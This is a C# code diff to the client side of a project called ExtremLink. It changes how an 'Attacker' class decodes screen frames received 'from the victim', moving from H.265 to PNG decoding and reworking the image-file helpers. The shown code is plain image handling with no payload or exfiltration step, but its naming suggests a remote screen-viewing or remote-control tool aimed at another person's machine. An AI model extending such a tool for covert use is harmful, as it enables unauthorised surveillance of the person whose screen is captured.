@@ -69,7 +69,7 @@ namespace ExtremLink_Client_v2.Classes
         // Constructor:
         private Attacker() : base()
         {
-
+            this.tempPngFileName = "AttackerTempFrame.png";
         }
 
         public void ConnectToServer(string serverIpAddr)
@@ -219,7 +219,7 @@ namespace ExtremLink_Client_v2.Classes
             while (true)
             {
                 byte[] currentFrameByteArr = this.GetFrame();
-                this.currentFrame = this.ConvertByteArrayToBitmapImage(currentFrameByteArr);
+                this.currentFrame = this.ConvertPngBytesToBitmapImage(currentFrameByteArr);
                 this.InsertBitmapImageToPngFile(this.currentFrame);
                 Thread.Sleep(1000);
             }
@@ -304,7 +304,7 @@ namespace ExtremLink_Client_v2.Classes
         public byte[] GetFrame()
         {
             // Input: Nothing.
-            // Output: The function gets a frame from the victim as a byte array in h265 format.
+            // Output: The function gets a frame from the victim as a byte array in png format.
             Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
             int streamId = -1;
             int totalPackets = -1;
@@ -352,7 +352,80 @@ namespace ExtremLink_Client_v2.Classes
                 return ms.ToArray();
             }
         }
-        public BitmapImage ConvertByteArrayToBitmapImage(byte[] h265Bytes)
+        public BitmapImage ConvertPngBytesToBitmapImage(byte[] pngBytes)
+        {
+            if (pngBytes == null || pngBytes.Length == 0) { throw new ArgumentException("Invalid PNG byte array."); }
+
+            using (var stream = new MemoryStream(pngBytes))
+            {
+                BitmapImage bitmap = new BitmapImage();
+                bitmap.BeginInit();
+                bitmap.CacheOption = BitmapCacheOption.OnLoad;
+                bitmap.StreamSource = stream;
+                bitmap.EndInit();
+                bitmap.Freeze();
+                return bitmap;
+            }
+        }
+        public string InsertBitmapImageToPngFile(BitmapImage frame)
+        {
+            // Input: A BitmapImage object which contains an image.
+            // Output: The function creates a png file, inserts the given BitmapImage to the png file and returns it name.
+            if (frame == null)
+                throw new ArgumentNullException(nameof(frame), "BitmapImage cannot be null");
+
+            // Create a PNG encoder
+            PngBitmapEncoder encoder = new PngBitmapEncoder();
+
+            // Add the BitmapImage to the encoder
+            encoder.Frames.Add(BitmapFrame.Create(frame));
+
+            // Generate a unique file name with timestamp
+            string fileName = $"tempFrame.png";
+
+            try
+            {
+                // Save the encoded image to a file
+                using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
+                {
+                    encoder.Save(fs);
+                }
+
+                return fileName;
+            }
+            catch (Exception ex)
+            {
+                throw new IOException($"Failed to create PNG file from BitmapImage: {ex.Message}", ex);
+            }
+        }
+        public BitmapImage GetBitmapImageFromPNGFile(string pngFileName)
+        {
+            // Input: A string which represent the path of a png file.
+            // Output: A BitmapImage which represent the image of the given png file.
+            if (string.IsNullOrEmpty(pngFileName))
+                throw new ArgumentException("PNG file name cannot be null or empty", nameof(pngFileName));
+
+            if (!File.Exists(pngFileName))
+                throw new FileNotFoundException($"The specified PNG file does not exist: {pngFileName}", pngFileName);
+
+            try
+            {
+                BitmapImage bitmap = new BitmapImage();
+                bitmap.BeginInit();
+                bitmap.UriSource = new Uri(pngFileName, UriKind.Relative);
+                bitmap.CacheOption = BitmapCacheOption.OnLoad; // Load immediately into memory
+                bitmap.EndInit();
+                bitmap.Freeze(); // Make it immutable and thread-safe
+
+                return bitmap;
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException($"Failed to load PNG file into BitmapImage: {ex.Message}", ex);
+            }
+        }
+
+        /* public BitmapImage ConvertByteArrayToBitmapImage(byte[] h265Bytes)
         {
             try
             {
@@ -404,63 +477,9 @@ namespace ExtremLink_Client_v2.Classes
                 throw new Exception($"Error converting H.265 to BitmapImage: {ex.Message}");
             }
         }
-        public string InsertBitmapImageToPngFile(BitmapImage frame)
-        {
-            // Input: A BitmapImage object which contains an image.
-            // Output: The function creates a png file, inserts the given BitmapImage to the png file and returns it name.
-            if (frame == null)
-                throw new ArgumentNullException(nameof(frame), "BitmapImage cannot be null");
-
-            // Create a PNG encoder
-            PngBitmapEncoder encoder = new PngBitmapEncoder();
-
-            // Add the BitmapImage to the encoder
-            encoder.Frames.Add(BitmapFrame.Create(frame));
-
-            // Generate a unique file name with timestamp
-            string fileName = $"tempFrame.png";
-            string filePath = Path.Combine(Path.GetTempPath(), fileName);
-
-            try
-            {
-                // Save the encoded image to a file
-                using (FileStream fs = new FileStream(filePath, FileMode.Create, FileAccess.Write))
-                {
-                    encoder.Save(fs);
-                }
-
-                return fileName;
-            }
-            catch (Exception ex)
-            {
-                throw new IOException($"Failed to create PNG file from BitmapImage: {ex.Message}", ex);
-            }
-        }
-        public BitmapImage GetBitmapImageFromPNGFile(string pngFileName)
-        {
-            // Input: A string which represent the path of a png file.
-            // Output: A BitmapImage which represent the image of the given png file.
-            if (string.IsNullOrEmpty(pngFileName))
-                throw new ArgumentException("PNG file name cannot be null or empty", nameof(pngFileName));
-
-            if (!File.Exists(pngFileName))
-                throw new FileNotFoundException($"The specified PNG file does not exist: {pngFileName}", pngFileName);
-
-            try
-            {
-                BitmapImage bitmap = new BitmapImage();
-                bitmap.BeginInit();
-                bitmap.UriSource = new Uri(pngFileName, UriKind.Absolute); // Use absolute path
-                bitmap.CacheOption = BitmapCacheOption.OnLoad; // Load immediately into memory
-                bitmap.EndInit();
-                bitmap.Freeze(); // Make it immutable and thread-safe
-
-                return bitmap;
-            }
-            catch (Exception ex)
-            {
-                throw new InvalidOperationException($"Failed to load PNG file into BitmapImage: {ex.Message}", ex);
-            }
-        }
+        */
+        /*
+        
+        */
     }
 }
